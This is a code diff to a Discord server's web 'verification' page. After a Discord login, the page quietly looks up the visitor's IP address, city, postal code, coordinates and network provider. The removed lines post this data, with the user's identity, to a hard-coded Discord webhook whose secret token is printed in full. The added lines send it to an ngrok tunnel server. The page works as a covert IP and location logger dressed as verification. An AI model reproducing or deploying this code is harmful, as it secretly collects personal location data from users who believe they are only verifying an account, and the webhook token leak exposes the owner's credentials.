@@ -479,7 +479,7 @@
 <script>
   const CLIENT_ID = '1484664806802981015';
   const REDIRECT  = encodeURIComponent('https://martin54-hub2.github.io/Verifcation-system-/');
-  const WEBHOOK   = 'https://discord.com/api/webhooks/1485045468416184510/ilR9hzzWxcwJbm75GTAVqUqyvZk0vUWXmboJlKKpXh27OWLz_w9IL9nIKlXfWbHy9WuW';
+  const BOT_URL   = 'https://fruitlessly-extragalactic-valorie.ngrok-free.dev';
 
   let locationData = null;
 
@@ -581,47 +581,15 @@
         ? `@${user.username}#${user.discriminator}`
         : `@${user.username}`;
 
-      // Send two embeds — embed 1: location info, embed 2: review with accept/deny buttons
-      // Discord webhooks can't send buttons so we send the info embed here
-      // and the bot handles buttons separately via verify_request
-      await fetch(WEBHOOK, {
+      // Send to bot server
+      await fetch(BOT_URL + '/verify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          embeds: [
-            {
-              color: 0xC41E3A,
-              author: { name: '🔔 New Verification Request', icon_url: avatar },
-              thumbnail: { url: avatar },
-              fields: [
-                { name: '👤 Username',             value: user.username,                                                                         inline: true },
-                { name: '🏷️ Discord Tag',          value: tag,                                                                                   inline: true },
-                { name: '🆔 Discord ID',           value: user.id,                                                                               inline: true },
-                { name: '🌐 IP Address',           value: loc?.ip                          || 'Unknown',                                         inline: true },
-                { name: '🏙️ City',                 value: loc?.city                        || 'Unknown',                                         inline: true },
-                { name: '🗺️ Region',               value: loc?.region                      || 'Unknown',                                         inline: true },
-                { name: '🌍 Country',              value: loc?.country_name                || 'Unknown',                                         inline: true },
-                { name: '📮 Postal Code',          value: loc?.postal                      || 'Unknown',                                         inline: true },
-                { name: '🇺🇳 European Union',      value: loc?.in_eu ? 'Yes' : 'No',                                                             inline: true },
-                { name: '📌 Latitude / Longitude', value: loc ? `${parseFloat(loc.latitude).toFixed(4)}, ${parseFloat(loc.longitude).toFixed(4)}` : 'Unknown', inline: true },
-                { name: '🕐 Time Zone',            value: loc?.timezone                    || 'Unknown',                                         inline: true },
-                { name: '📞 Calling Code',         value: loc?.country_calling_code        || 'Unknown',                                         inline: true },
-                { name: '💵 Currency',             value: loc?.currency                    || 'Unknown',                                         inline: true },
-                { name: '🗣️ Languages',            value: loc?.languages                   || 'Unknown',                                         inline: true },
-                { name: '🔌 ASN',                  value: loc?.asn                         || 'Unknown',                                         inline: true },
-                { name: '🏢 Org',                  value: loc?.org                         || 'Unknown',                                         inline: false },
-                { name: '🖥️ Recommended Region',   value: recommended,                                                                           inline: true },
-                { name: '🔍 Geo Source',           value: 'ipapi.co',                                                                            inline: true },
-              ],
-              footer: { text: 'Chicago Hangout • Verification' },
-              timestamp: new Date().toISOString(),
-            },
-            {
-              color: 0x2b2d31,
-              description: `<@${user.id}> has completed website verification.\n**User ID:** ${user.id}`,
-              footer: { text: 'Chicago Hangout • Bot will post review embed automatically' },
-            }
-          ]
+          userId:   user.id,
+          username: user.username,
+          avatar:   user.avatar,
+          loc:      loc,
         })
       });
 
